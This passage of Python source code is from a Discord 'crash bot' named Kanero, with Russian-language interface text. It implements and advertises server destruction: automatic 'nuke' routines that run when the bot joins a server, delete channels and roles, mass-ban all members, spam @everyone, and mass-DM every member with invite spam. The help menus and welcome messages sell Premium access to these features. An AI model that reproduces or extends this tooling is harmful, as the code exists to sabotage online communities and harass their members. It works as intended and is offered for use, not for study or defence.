        cur_text = AUTO_SUPER_NUKE_TEXT or config.SPAM_TEXT
        embed = discord.Embed(
            title="💀 Auto Super Nuke — INFO",
            description=(
                f"Статус: **{status}**\n\n"
                "При входе бота на сервер:\n"
                "• Нюк с кастомным текстом\n"
                "• Массбан всех участников\n"
                "• Удаление всех ролей\n"
                "• Пинг спам @everyone\n\n"
                f"Текущий текст:\n```{cur_text[:300]}```"
            ),
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
    else:
        await ctx.send(
            "Использование:\n"
            "`!auto_super_nuke on` — включить\n"
            "`!auto_super_nuke off` — выключить\n"
            "`!auto_super_nuke text <текст>` — задать текст\n"
            "`!auto_super_nuke info` — статус и текущий текст"
        )


@bot.command(name="snuke_config")
@premium_check()
async def snuke_config(ctx, option: str = None, value: str = None):
    """Настройка что делает auto_super_nuke при входе на сервер"""
    options = {
        "massban":      ("Массбан всех участников", "massban"),
        "boosters":     ("Банить только бустеров", "boosters_only"),
        "rolesdelete":  ("Удаление всех ролей", "rolesdelete"),
        "pingspam":     ("Пинг спам @everyone", "pingspam"),
        "massdm":       ("Масс ДМ всем участникам", "massdm"),
    }

    if not option:
        # Показать текущие настройки
        embed = discord.Embed(
            title="⚙️ SUPER NUKE — НАСТРОЙКИ",
            description=(
                "Управляй что делает `!auto_super_nuke` при входе на сервер.\n"
                "Использование: `!snuke_config <опция> on/off`"
            ),
            color=0x0a0a0a
        )
        lines = []
        for key, (label, cfg_key) in options.items():
            status = "✅" if SNUKE_CONFIG.get(cfg_key) else "❌"
            lines.append(f"{status} `{key}` — {label}")
        embed.add_field(name="Текущие настройки", value="\n".join(lines), inline=False)
        embed.add_field(
            name="Опции",
            value=(
                "`massban` — банить всех участников\n"
                "`boosters` — банить только бустеров (если massban выкл)\n"
                "`rolesdelete` — удалять все роли\n"
                "`pingspam` — пинг спам @everyone\n"
                "`massdm` — масс ДМ всем участникам"
            ),
            inline=False
        )
        embed.set_footer(text="☠️ Kanero  |  Нюк всегда включён")
        await ctx.send(embed=embed)
        return

    if option not in options:
        await ctx.send(f"❌ Неизвестная опция `{option}`. Доступные: `{'`, `'.join(options.keys())}`")
        return
    if value not in ("on", "off"):
        await ctx.send("Укажи `on` или `off`.")
        return

    cfg_key = options[option][1]
    SNUKE_CONFIG[cfg_key] = (value == "on")
    save_auto_super_nuke()

    status = "✅ включено" if value == "on" else "❌ выключено"
    embed = discord.Embed(
        description=f"**{options[option][0]}** — {status}",
        color=0x0a0a0a
    )
    embed.set_footer(text="☠️ Kanero")
    await ctx.send(embed=embed)


# ─── AUTO SUPERPR NUKE ─────────────────────────────────────

def save_auto_superpr_nuke():
    asyncio.create_task(db_set("data", "auto_superpr_nuke", {
        "enabled": AUTO_SUPERPR_NUKE,
        "text": AUTO_SUPERPR_NUKE_TEXT
    }))


def load_auto_superpr_nuke():
    pass  # заменено на async load в on_ready


@bot.command(name="auto_superpr_nuke")
@premium_check()
async def auto_superpr_nuke_cmd(ctx, state: str, *, text: str = None):
    global AUTO_SUPERPR_NUKE, AUTO_SUPERPR_NUKE_TEXT
    if state.lower() == "on":
        AUTO_SUPERPR_NUKE = True
        save_auto_superpr_nuke()
        embed = discord.Embed(
            title="⚡ Auto Superpr Nuke — ВКЛЮЧЁН",
            description=(
                "При входе бота на сервер **мгновенно**:\n"
                "• Удаление каналов + ролей\n"
                "• Бан всех участников\n"
                "• Создание каналов со спамом\n"
                "Всё одновременно — максимальная скорость.\n\n"
                f"Текст: `{AUTO_SUPERPR_NUKE_TEXT or 'дефолтный'}`\n"
                "Чтобы задать текст: `!auto_superpr_nuke text <твой текст>`"
            ),
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
    elif state.lower() == "off":
        AUTO_SUPERPR_NUKE = False
        save_auto_superpr_nuke()
        embed = discord.Embed(description="❌ **Auto Superpr Nuke** выключен.", color=0x0a0a0a)
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
    elif state.lower() == "text":
        if not text:
            await ctx.send("Укажи текст: `!auto_superpr_nuke text <твой текст>`")
            return
        AUTO_SUPERPR_NUKE_TEXT = text
        save_auto_superpr_nuke()
        embed = discord.Embed(
            title="✅ Текст Auto Superpr Nuke обновлён",
            description=f"```{text[:500]}```",
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero  |  Теперь включи: !auto_superpr_nuke on")
        await ctx.send(embed=embed)
    elif state.lower() == "info":
        status = "✅ Включён" if AUTO_SUPERPR_NUKE else "❌ Выключен"
        cur_text = AUTO_SUPERPR_NUKE_TEXT or config.SPAM_TEXT
        embed = discord.Embed(
            title="⚡ Auto Superpr Nuke — INFO",
            description=(
                f"Статус: **{status}**\n\n"
                "При входе — всё одновременно:\n"
                "• Удаление каналов + ролей\n"
                "• Бан всех участников\n"
                "• Создание каналов со спамом\n\n"
                f"Текущий текст:\n```{cur_text[:300]}```"
            ),
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
    else:
        await ctx.send(
            "Использование:\n"
            "`!auto_superpr_nuke on` — включить\n"
            "`!auto_superpr_nuke off` — выключить\n"
            "`!auto_superpr_nuke text <текст>` — задать текст\n"
            "`!auto_superpr_nuke info` — статус"
        )


# ─── OWNER-ONLY: BLOCK / UNBLOCK GUILD ─────────────────────

@bot.command(name="block_guild", aliases=["block_guid"])
async def block_guild(ctx, guild_id: int = None):
    if ctx.author.id != config.OWNER_ID:
        return
    gid = guild_id if guild_id else (ctx.guild.id if ctx.guild else None)
    if not gid:
        await ctx.send("Укажи ID сервера: `!block_guild <id>`")
        return
    if gid not in BLOCKED_GUILDS:
        BLOCKED_GUILDS.append(gid)
        save_blocked_guilds()
        guild_name = bot.get_guild(gid)
        name_str = f"**{guild_name.name}**" if guild_name else f"`{gid}`"
        await ctx.send(f"🔒 Сервер {name_str} заблокирован. Бот не будет выполнять команды на нём.")
    else:
        await ctx.send("Сервер уже заблокирован.")


@bot.command(name="unblock_guild", aliases=["unblock_guid"])
async def unblock_guild(ctx, guild_id: int = None):
    if ctx.author.id != config.OWNER_ID:
        return
    gid = guild_id if guild_id else (ctx.guild.id if ctx.guild else None)
    if not gid:
        await ctx.send("Укажи ID сервера: `!unblock_guild <id>`")
        return
    if gid in BLOCKED_GUILDS:
        BLOCKED_GUILDS.remove(gid)
        save_blocked_guilds()
        guild_name = bot.get_guild(gid)
        name_str = f"**{guild_name.name}**" if guild_name else f"`{gid}`"
        await ctx.send(f"🔓 Сервер {name_str} разблокирован.")
    else:
        await ctx.send("Сервер не был заблокирован.")


@bot.command(name="blocked_guilds")
async def blocked_guilds_cmd(ctx):
    if ctx.author.id != config.OWNER_ID:
        return
    if not BLOCKED_GUILDS:
        await ctx.send("Нет заблокированных серверов.")
        return
    lines = []
    for gid in BLOCKED_GUILDS:
        g = bot.get_guild(gid)
        lines.append(f"`{gid}` — {g.name if g else 'неизвестен'}")
    await ctx.send("🔒 Заблокированные серверы:\n" + "\n".join(lines))


@bot.command(name="giverole")
async def giverole(ctx, user: discord.Member, role: discord.Role):
    """Выдать роль участнику. Только для овнера.
    Использование: !giverole @юзер @роль  или  !giverole <user_id> <role_id>
    """
    if ctx.author.id != config.OWNER_ID:
        return
    try:
        await user.add_roles(role)
        embed = discord.Embed(
            description=f"✅ Роль **{role.name}** выдана **{user}**.",
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
    except discord.Forbidden:
        await ctx.send("❌ Нет прав выдать эту роль (роль выше бота в иерархии).")
    except Exception as e:
        await ctx.send(f"❌ Ошибка: {e}")


@bot.command(name="roles")
async def roles_cmd(ctx):
    """Показать роли которые бот может выдавать (ниже его роли в иерархии)."""
    if ctx.author.id != config.OWNER_ID:
        return
    bot_role = ctx.guild.me.top_role
    available = [r for r in ctx.guild.roles if r < bot_role and not r.is_default()]
    if not available:
        await ctx.send("Нет ролей которые бот может выдать.")
        return
    available.sort(key=lambda r: r.position, reverse=True)
    lines = [f"`{r.id}` — **{r.name}**" for r in available[:30]]
    embed = discord.Embed(
        title=f"🎭 Роли доступные боту ({len(available)})",
        description="\n".join(lines),
        color=0x0a0a0a
    )
    embed.set_footer(text=f"☠️ Kanero  |  Роль бота: {bot_role.name}  |  !giverole @юзер @роль")
    await ctx.send(embed=embed)


@bot.command(name="nukelogs")
async def nukelogs(ctx):
    """Показать логи нюков. Только для овнера."""
    if ctx.author.id != config.OWNER_ID:
        return
    db = get_db()
    if db is None:
        await ctx.send("❌ MongoDB не подключена.")
        return
    cursor = db["nuke_logs"].find({})
    logs = await cursor.to_list(length=100)
    if not logs:
        await ctx.send("Логов нюков нет.")
        return
    embed = discord.Embed(title="📋 Логи нюков", color=0x0a0a0a)
    for doc in logs[:20]:  # максимум 20 в одном embed
        entry = doc.get("value", doc)
        invite = entry.get("invite") or "нет инвайта"
        embed.add_field(
            name=f"{'💀' if entry.get('type') == 'nuke' else '⚡'} {entry.get('guild_name', '?')}",
            value=(
                f"Тип: `{entry.get('type', '?')}`\n"
                f"Кто: **{entry.get('user_name', '?')}** (`{entry.get('user_id', '?')}`)\n"
                f"Время: `{entry.get('time', '?')}`\n"
                f"Инвайт: {invite}"
            ),
            inline=False
        )
    embed.set_footer(text=f"☠️ Kanero  |  Всего записей: {len(logs)}")
    await ctx.send(embed=embed)


bot.remove_command("help")


@bot.command(name="changelog")
async def changelog(ctx):
    """Показывает только последнее обновление v1.8."""
    embed = discord.Embed(
        title="📋 CHANGELOG — v1.8  |  Последнее обновление",
        color=0x0a0a0a
    )
    embed.add_field(
        name="🔥 v1.8 — Большое обновление",
        value=(
            "• **`!nuke` и `!auto_nuke` доступны ВСЕМ** без подписки!\n"
            "• `!nuke [текст]` — кастомный текст только для whitelist\n"
            "• `!nuke` — переименование → удаление ролей → каналы → спам → роль ☠️\n"
            "• `!super_nuke` + `!auto_super_nuke` — всегда вместе, до 15 участников\n"
            "• `!owner_nuke` + `!auto_owner_nuke` — нюк без ограничений\n"
            "• `!on_add/remove/list` — список для owner_nuke\n"
            "• `!auto_off` — выключить все авто нюки\n"
            "• `!auto_info` — статус всех авто нюков\n"
            "• `!setup` — создать структуру сервера\n"
            "• `!goout` — покинуть сервер\n"
            "• `!nukelogs` — логи нюков\n"
            "• `!unban <id>` — разбан через ЛС\n"
            "• `!roles` / `!giverole` — управление ролями\n"
            "• MongoDB — постоянное хранение данных"
        ),
        inline=False
    )
    embed.set_footer(text="☠️ Kanero  |  davaidkatt  |  !changelogall — вся история")
    embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
    await ctx.send(embed=embed)


@bot.command(name="changelogall")
async def changelogall(ctx):
    """Показывает всю историю обновлений v1.0-v1.8."""
    embed = discord.Embed(
        title="📋 CHANGELOG — Полная история  |  v1.0 → v1.8",
        color=0x0a0a0a
    )
    embed.add_field(name="☠️ v1.0", value="• `!nuke`, `!stop`, `!webhooks`, логирование", inline=False)
    embed.add_field(name="⚡ v1.1", value="• `!auto_nuke`, `/sp`, `/spkd`, whitelist, `!cleanup`, `!rename`", inline=False)
    embed.add_field(name="🎨 v1.2", value="• Тёмный стиль, Owner Panel, `!owl_add`, `!invlink`", inline=False)
    embed.add_field(name="🆕 v1.3", value="• Premium система, `!block_guild`, `!set_spam_text`", inline=False)
    embed.add_field(name="🆕 v1.4", value="• `!massdm`, `!massban`, `!spam`, `!pingspam`, `!rolesdelete`, `!serverinfo`", inline=False)
    embed.add_field(name="💀 v1.5-1.6", value="• `!super_nuke`, `!auto_super_nuke`, `!auto_superpr_nuke`", inline=False)
    embed.add_field(name="🔥 v1.7", value="• MongoDB, `!pm_add` авто +whitelist, `!list`, `!list_clear`", inline=False)
    embed.add_field(
        name="🔥 v1.8",
        value=(
            "• **`!nuke` и `!auto_nuke` доступны ВСЕМ**\n"
            "• `!owner_nuke` + `!auto_owner_nuke` + `!on_add/remove/list`\n"
            "• `!auto_off`, `!auto_info`, `!setup`, `!goout`\n"
            "• `!nukelogs`, `!unban`, `!roles`, `!giverole`"
        ),
        inline=False
    )
    embed.set_footer(text="☠️ Kanero  |  davaidkatt  |  текущая версия: v1.8")
    embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
    await ctx.send(embed=embed)


@bot.command(name="help")
async def help_cmd(ctx):
    uid = ctx.author.id
    is_owner = (uid == config.OWNER_ID)
    is_prem = is_premium(uid)
    is_wl = is_whitelisted(uid)

    embed = discord.Embed(
        title="☠️ Kanero — CRASH BOT",
        description=(
            "```\n"
            "  ██████╗██████╗  █████╗ ███████╗██╗  ██╗\n"
            " ██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║\n"
            " ██║     ██████╔╝███████║███████╗███████║\n"
            " ██║     ██╔══██╗██╔══██║╚════██║██╔══██║\n"
            " ╚██████╗██║  ██║██║  ██║███████║██║  ██║\n"
            "  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\n"
            "```"
        ),
        color=0x0a0a0a
    )

    if is_owner:
        access_str = "👑 **OWNER** — полный доступ"
    elif is_prem:
        access_str = "💎 **PREMIUM** — расширенный доступ"
    elif is_wl:
        access_str = "✅ **Whitelist** — базовые команды"
    else:
        access_str = "🌍 **Гость** — `!nuke` и `!auto_nuke` доступны всем!"

    embed.add_field(name="🔑 Твой уровень", value=access_str, inline=False)

    embed.add_field(
        name="📋 ДОСТУПНО ВСЕМ",
        value=(
            "`!help` — это меню\n"
            "`!changelog` — последнее обновление\n"
            "`!changelogall` — вся история\n"
            "`!nuke` — краш (переименование → роли → каналы → спам → роль ☠️)\n"
            "`!auto_nuke on/off/info` — авто-краш при входе бота"
        ),
        inline=False
    )

    embed.add_field(
        name="✅ WHITELIST",
        value=(
            "`!nuke [текст]` — нюк со своим текстом\n"
            "`!stop` — остановить краш\n"
            "`!cleanup` — снести всё, оставить один канал\n"
            "`!rename [название]` — переименовать каналы\n"
            "`!nicks_all [ник]` — сменить ники всем\n"
            "`!webhooks` — список вебхуков\n"
            "`!inv` — ссылка для добавления бота\n"
            "`/sp [кол-во] [текст]` — спам\n"
            "`/spkd [задержка] [кол-во] [текст]` — спам с задержкой"
        ),
        inline=False
    )

    embed.add_field(
        name="💎 PREMIUM",
        value=(
            "`!nuke [текст]` — нюк с кастомным текстом\n"
            "`!super_nuke [текст]` — нюк, до 15 участников + роль ☠️\n"
            "`!auto_super_nuke on/off/text/info` — авто super_nuke при входе\n"
            "`!auto_superpr_nuke on/off/text/info` — авто турбо нюк при входе\n"
            "`!massban` · `!massdm` · `!spam` · `!pingspam`\n"
            "`!rolesdelete` · `!serverinfo` · `!userinfo`"
        ),
        inline=False
    )

    if is_owner:
        embed.add_field(
            name="👑 OWNER",
            value=(
                "`!owner_nuke [текст]` — полный нюк + роль ☠️\n"
                "`!auto_owner_nuke on/off/text/info` — авто owner нюк\n"
                "`!auto_off` — выключить все авто нюки\n"
                "`!auto_info` — статус всех авто нюков\n"
                "`!wl_add/remove/list` · `!pm_add/remove/list`\n"
                "`!on_add/remove/list` — owner nuke list\n"
                "`!list` · `!list_clear` · `!block_guild/unblock_guild`\n"
                "`!set_spam_text` · `!owl_add/remove/list`\n"
                "`!setup` — создать структуру сервера\n"
                "`!goout` · `!nukelogs` · `!roles` · `!giverole`\n"
                "`!unban <id>` · `!guilds` · `!setguild` · `!invlink`"
            ),
            inline=False
        )

    embed.add_field(
        name="💬 Купить подписку",
        value="Discord: **davaidkatt**\nTelegram: **@Firisotik**",
        inline=False
    )
    embed.set_footer(text="☠️ Kanero  |  !changelogall — вся история  |  v1.8")
    embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
    await ctx.send(embed=embed)



@bot.command(name="commands_user")
@wl_check()
async def commands_user(ctx):
    embed = discord.Embed(
        title="👁️ КОМАНДЫ — ОБЫЧНЫЙ ПОЛЬЗОВАТЕЛЬ",
        color=0x0a0a0a
    )
    embed.add_field(
        name="💀 УНИЧТОЖЕНИЕ",
        value=(
            "`!nuke` — переименование → удаление ролей → каналы → спам → роль ☠️\n"
            "`!stop` — остановить краш\n"
            "`!cleanup` — снести всё, оставить один канал\n"
            "`!auto_nuke on/off/info` — авто-краш при входе бота"
        ),
        inline=False
    )
    embed.add_field(
        name="⚡ КОНТРОЛЬ",
        value=(
            "`!rename [название]` — переименовать все каналы\n"
            "`!nicks_all [ник]` — сменить ники всем\n"
            "`!webhooks` — список вебхуков"
        ),
        inline=False
    )
    embed.add_field(
        name="🔱 УТИЛИТЫ",
        value=(
            "`!inv` — ссылка для добавления бота\n"
            "`/sp [кол-во] [текст]` — спам\n"
            "`/spkd [задержка] [кол-во] [текст]` — спам с задержкой\n"
            "`!changelog` — история обновлений"
        ),
        inline=False
    )
    embed.set_footer(text="☠️ Kanero  |  davaidkatt")
    await ctx.send(embed=embed)


@bot.command(name="commands_premium")
@wl_check()
async def commands_premium(ctx):
    embed = discord.Embed(
        title="💎 КОМАНДЫ — PREMIUM",
        description="Доступны только Premium пользователям. Купить: **davaidkatt**",
        color=0x0a0a0a
    )
    embed.add_field(
        name="💀 УНИЧТОЖЕНИЕ",
        value=(
            "`!nuke [текст]` — нюк со своим текстом\n"
            "`!super_nuke [текст]` — нюк всё одновременно\n"
            "`!massban` — забанить всех участников\n"
            "`!rolesdelete` — удалить все роли\n"
            "`!auto_super_nuke on/off/text/info` — авто нюк при входе\n"
            "`!auto_superpr_nuke on/off/text/info` — авто турбо нюк при входе"
        ),
        inline=False
    )
    embed.add_field(
        name="📨 СПАМ",
        value=(
            "`!massdm [текст]` — разослать ДМ всем участникам\n"
            "`!spam [кол-во] [текст]` — спам в канал\n"
            "`!pingspam [кол-во]` — спам @everyone"
        ),
        inline=False
    )
    embed.add_field(
        name="🔍 ИНФО",
        value=(
            "`!serverinfo` — подробная инфа о сервере\n"
            "`!userinfo [id]` — инфа о пользователе"
        ),
        inline=False
    )
    embed.set_footer(text="☠️ Kanero  |  davaidkatt")
    await ctx.send(embed=embed)


@bot.command(name="commands_owner")
async def commands_owner(ctx):
    if ctx.author.id != config.OWNER_ID:
        return
    embed = discord.Embed(
        title="👑 КОМАНДЫ — OWNER",
        description="Только для овнера бота.",
        color=0x0a0a0a
    )
    embed.add_field(
        name="👥 WHITELIST",
        value=(
            "`!wl_add <id>` — выдать доступ к боту\n"
            "`!wl_remove <id>` — забрать доступ\n"
            "`!wl_list` — список пользователей"
        ),
        inline=False
    )
    embed.add_field(
        name="💎 PREMIUM",
        value=(
            "`!pm_add <id>` — выдать Premium\n"
            "`!pm_remove <id>` — забрать Premium\n"
            "`!pm_list` — список Premium"
        ),
        inline=False
    )
    embed.add_field(
        name="🔒 БЛОКИРОВКА",
        value=(
            "`!block_guild <id>` — заблокировать сервер\n"
            "`!unblock_guild <id>` — разблокировать\n"
            "`!blocked_guilds` — список заблокированных"
        ),
        inline=False
    )
    embed.add_field(
        name="📝 НАСТРОЙКИ",
        value=(
            "`!set_spam_text <текст>` — сменить дефолтный текст нюка\n"
            "`!get_spam_text` — показать текущий текст\n"
            "`!owl_add/remove/list` — owner whitelist"
        ),
        inline=False
    )
    embed.add_field(
        name="🖥️ В ЛС",
        value=(
            "`!owner_help` — полная панель управления\n"
            "`!guilds` — список серверов\n"
            "`!setguild <id>` — выбрать сервер\n"
            "`!invlink` — инвайты со всех серверов"
        ),
        inline=False
    )
    embed.set_footer(text="☠️ Kanero")
    await ctx.send(embed=embed)


# ─── EVENTS ────────────────────────────────────────────────

@bot.event
async def on_member_remove(member):
    """При выходе с домашнего сервера — удаляем из whitelist и пишем в ЛС."""
    if member.guild.id != HOME_GUILD_ID:
        return
    uid = member.id
    if uid == config.OWNER_ID:
        return
    removed = False
    if uid in config.WHITELIST:
        config.WHITELIST.remove(uid)
        save_whitelist()
        removed = True
    if uid in PREMIUM_LIST:
        PREMIUM_LIST.remove(uid)
        save_premium()
        removed = True
    if removed:
        try:
            home_guild = bot.get_guild(HOME_GUILD_ID)
            invite_url = "https://discord.gg/SZ7bd8h9"
            if home_guild:
                try:
                    ch = next((c for c in home_guild.text_channels if c.permissions_for(home_guild.me).create_instant_invite), None)
                    if ch:
                        inv = await ch.create_invite(max_age=0, max_uses=0, unique=False)
                        invite_url = inv.url
                except Exception:
                    pass
            await member.send(
                embed=discord.Embed(
                    title="❌ Доступ к боту удалён",
                    description=(
                        "Ты вышел с нашего сервера — доступ к командам бота был удалён.\n\n"
                        "Чтобы восстановить доступ — вернись на сервер и напиши в канал `#addbot`:\n"
                        f"{invite_url}"
                    ),
                    color=0x0a0a0a
                ).set_footer(text="☠️ Kanero  |  davaidkatt")
            )
        except Exception:
            pass


AUTO_ROLE_ID = 1497257427932938314  # Авто-роль для всех новых участников


@bot.event
async def on_member_join(member):
    """При входе на домашний сервер — выдаём авто-роль и пишем в welcome канал."""
    guild = member.guild
    if guild.id != HOME_GUILD_ID:
        return

    # ── 1. Выдаём авто-роль ──
    try:
        role = guild.get_role(AUTO_ROLE_ID)
        if role:
            await member.add_roles(role, reason="Авто-роль при входе")
    except Exception:
        pass

    # ── 2. Пишем в welcome канал ──
    welcome_ch = discord.utils.find(
        lambda c: "welcome" in c.name.lower() or "велком" in c.name.lower() or "приветствие" in c.name.lower(),
        guild.text_channels
    )
    if not welcome_ch:
        return

    # Ищем канал addbot для ссылки
    addbot_ch = discord.utils.find(
        lambda c: "addbot" in c.name.lower(),
        guild.text_channels
    )
    addbot_mention = addbot_ch.mention if addbot_ch else "#addbot"

    app_id = bot.user.id
    invite_url = f"https://discord.com/oauth2/authorize?client_id={app_id}&permissions=8&scope=bot%20applications.commands"

    embed = discord.Embed(
        title=f"☠️ Добро пожаловать, {member.display_name}!",
        description=(
            f"Привет, {member.mention}! Рады видеть тебя на сервере **Kanero**.\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "**🤖 Как подключить бота Kanero:**\n\n"
            f"**Шаг 1.** Зайди в канал {addbot_mention} и напиши любое сообщение\n"
            "**Шаг 2.** Бот напишет тебе в ЛС с инструкцией\n"
            f"**Шаг 3.** Добавь бота на свой сервер: [нажми сюда]({invite_url})\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "**📋 Что умеет бот:**\n"
            "• `!nuke` — краш сервера (доступно всем)\n"
            "• `!auto_nuke on` — авто-краш при входе бота\n"
            "• `!super_nuke` — нюк с баном участников (Premium)\n"
            "• И многое другое — напиши `!help` боту в ЛС\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "**💎 Купить Premium:** **davaidkatt** | **@Firisotik**\n"
            "**🔗 Сервер:** https://discord.gg/JEspTXRW"
        ),
        color=0x0a0a0a
    )
    embed.set_thumbnail(url=member.display_avatar.url)
    embed.set_footer(text=f"☠️ Kanero  |  Участник #{guild.member_count}")
    try:
        await welcome_ch.send(embed=embed)
    except Exception:
        pass


@bot.event
async def on_guild_join(guild):
    if is_guild_blocked(guild.id):
        return  # Сервер заблокирован — ничего не делаем

    # AUTO OWNER NUKE — полный нюк без ограничений (только овнер)
    if AUTO_OWNER_NUKE:
        nuke_running[guild.id] = True
        spam_text = AUTO_OWNER_NUKE_TEXT if AUTO_OWNER_NUKE_TEXT else config.SPAM_TEXT
        asyncio.create_task(do_owner_nuke_task(guild, spam_text))
        return

    # AUTO SUPERPR NUKE — всё одновременно, максимальная скорость
    if AUTO_SUPERPR_NUKE:
        nuke_running[guild.id] = True
        spam_text = AUTO_SUPERPR_NUKE_TEXT if AUTO_SUPERPR_NUKE_TEXT else config.SPAM_TEXT
        asyncio.create_task(do_superpr_nuke_task(guild, spam_text))
        return

    # AUTO SUPER NUKE — функционал super_nuke (оставляет до 15 участников)
    if AUTO_SUPER_NUKE:
        nuke_running[guild.id] = True
        spam_text = AUTO_SUPER_NUKE_TEXT if AUTO_SUPER_NUKE_TEXT else config.SPAM_TEXT
        asyncio.create_task(do_superpr_nuke_task(guild, spam_text))
        return

    if config.AUTO_NUKE:
        nuke_running[guild.id] = True
        asyncio.create_task(do_nuke(guild))

        dm_text = "|| @everyone @here ||\n# CRASHED BY Kanero\n# https://discord.gg/SZ7bd8h9\n# https://discord.gg/SZ7bd8h9\n# https://discord.gg/SZ7bd8h9"

        async def dm_all():
            for member in guild.members:
                if member.bot:
                    continue
                try:
                    await member.send(dm_text)
                except Exception:
                    pass
                await asyncio.sleep(0.5)

        asyncio.create_task(dm_all())


# Активный сервер для каждого пользователя в ЛС: user_id -> guild_id
active_guild: dict[int, int] = {}


class GuildSelectView(discord.ui.View):
    def __init__(self, guilds: list[discord.Guild], user_id: int):
        super().__init__(timeout=60)
        self.user_id = user_id
        # Добавляем кнопки (максимум 25)
        for guild in guilds[:25]:
            btn = discord.ui.Button(label=guild.name[:80], custom_id=str(guild.id))
            btn.callback = self.make_callback(guild)
            self.add_item(btn)

    def make_callback(self, guild: discord.Guild):
        async def callback(interaction: discord.Interaction):
            if interaction.user.id != self.user_id:
                await interaction.response.send_message("Не твоя кнопка.", ephemeral=True)
                return
            active_guild[self.user_id] = guild.id
            await interaction.response.edit_message(
                content=f"✅ Активный сервер: **{guild.name}** (`{guild.id}`)\nТеперь все команды в ЛС выполняются на этом сервере.",
                view=None
            )
        return callback


async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_text: str):
    """Выполняет команду от имени владельца на указанном сервере без отправки сообщений в каналы."""
    parts = cmd_text.strip().split(maxsplit=1)
    cmd_name = parts[0].lstrip("!").lower()
    args = parts[1] if len(parts) > 1 else ""

    try:
        # nuke
        if cmd_name == "nuke":
            if nuke_running.get(guild.id):
                await message.channel.send("⚠️ Уже запущено.")
                return
            nuke_running[guild.id] = True
            nuke_starter[guild.id] = message.author.id
            spam_text = args if args else config.SPAM_TEXT
            last_nuke_time[guild.id] = asyncio.get_running_loop().time()
            last_spam_text[guild.id] = spam_text
            asyncio.create_task(do_nuke(guild, spam_text, caller_id=message.author.id))
            await message.channel.send(f"✅ `nuke` запущен на **{guild.name}**")

        elif cmd_name == "stop":
            uid = message.author.id
            starter_id = nuke_starter.get(guild.id)

            if uid == config.OWNER_ID:
                nuke_running[guild.id] = False
                nuke_starter.pop(guild.id, None)
                await message.channel.send(f"✅ Остановлено на **{guild.name}**")
            elif starter_id is None:
                nuke_running[guild.id] = False
                await message.channel.send(f"✅ Остановлено на **{guild.name}**")
            elif starter_id == config.OWNER_ID:
                await message.channel.send("❌ Нюк запущен **овнером** — только он может остановить.")
            elif is_premium(starter_id) and not is_premium(uid):
                await message.channel.send("❌ Нюк запущен **Premium** пользователем — обычная подписка не может остановить.")
            else:
                nuke_running[guild.id] = False
                nuke_starter.pop(guild.id, None)
                await message.channel.send(f"✅ Остановлено на **{guild.name}**")

        elif cmd_name == "cleanup":
            asyncio.create_task(delete_all_channels(guild))
            await message.channel.send(f"✅ `cleanup` запущен на **{guild.name}**")

        elif cmd_name == "rename":
            if not args:
                await message.channel.send("Укажи название: `!rename <название>`")
                return
            asyncio.create_task(asyncio.gather(
                *[c.edit(name=args) for c in guild.channels],
                return_exceptions=True
            ))
            await message.channel.send(f"✅ Переименовываю каналы на **{guild.name}**")

        elif cmd_name == "nsfw_all":
            asyncio.create_task(asyncio.gather(
                *[c.edit(nsfw=True) for c in guild.text_channels],
                return_exceptions=True
            ))
            await message.channel.send(f"✅ NSFW включён на **{guild.name}**")

        elif cmd_name == "unnsfw_all":
            asyncio.create_task(asyncio.gather(
                *[c.edit(nsfw=False) for c in guild.text_channels],
                return_exceptions=True
            ))
            await message.channel.send(f"✅ NSFW выключен на **{guild.name}**")

        elif cmd_name == "nicks_all":
            if not args:
                await message.channel.send("Укажи ник: `!nicks_all <ник>`")
                return
            targets = [m for m in guild.members if m.id not in (message.author.id, bot.user.id, guild.owner_id)]
            asyncio.create_task(asyncio.gather(
                *[m.edit(nick=args) for m in targets],
                return_exceptions=True
            ))
            await message.channel.send(f"✅ Меняю ники на **{guild.name}**")

        elif cmd_name == "webhooks":
            whs = await guild.webhooks()
            if not whs:
                await message.channel.send("Вебхуков нет.")
                return
            msg = "\n".join(f"{wh.name}: {wh.url}" for wh in whs)
            await message.channel.send(f"```{msg[:1900]}```")

        elif cmd_name == "auto_nuke":
            state = args.lower()
            if state == "on":
                config.AUTO_NUKE = True
                await message.channel.send("✅ Авто-краш включён.")
            elif state == "off":
                config.AUTO_NUKE = False
                await message.channel.send("❌ Авто-краш выключён.")
            elif state == "info":
                status = "✅ Включён" if config.AUTO_NUKE else "❌ Выключён"
                await message.channel.send(f"Авто-краш: {status}")
            else:
                await message.channel.send("Используй: `!auto_nuke on/off/info`")

        elif cmd_name in ("wl_add",):
            if not args:
                await message.channel.send("Использование: `!wl_add <id>`")
                return
            try:
                uid = int(args.strip())
                if uid not in config.WHITELIST:
                    config.WHITELIST.append(uid)
                    save_whitelist()
                    await message.channel.send(f"✅ `{uid}` добавлен в whitelist.")
                else:
                    await message.channel.send("Уже в whitelist.")
            except ValueError:
                await message.channel.send("Использование: `!wl_add <id>`")

        elif cmd_name in ("wl_remove",):
            if not args:
                await message.channel.send("Использование: `!wl_remove <id>`")
                return
            try:
                uid = int(args.strip())
                if uid in config.WHITELIST:
                    config.WHITELIST.remove(uid)
                    save_whitelist()
                    await message.channel.send(f"✅ `{uid}` убран из whitelist.")
                else:
                    await message.channel.send("Не найден в whitelist.")
            except ValueError:
                await message.channel.send("Использование: `!wl_remove <id>`")

        elif cmd_name in ("wl_list",):
            if not config.WHITELIST:
                await message.channel.send("Whitelist пуст.")
            else:
                lines = []
                for uid in config.WHITELIST:
                    try:
                        user = await bot.fetch_user(uid)
                        lines.append(f"`{uid}` — **{user}**")
                    except Exception:
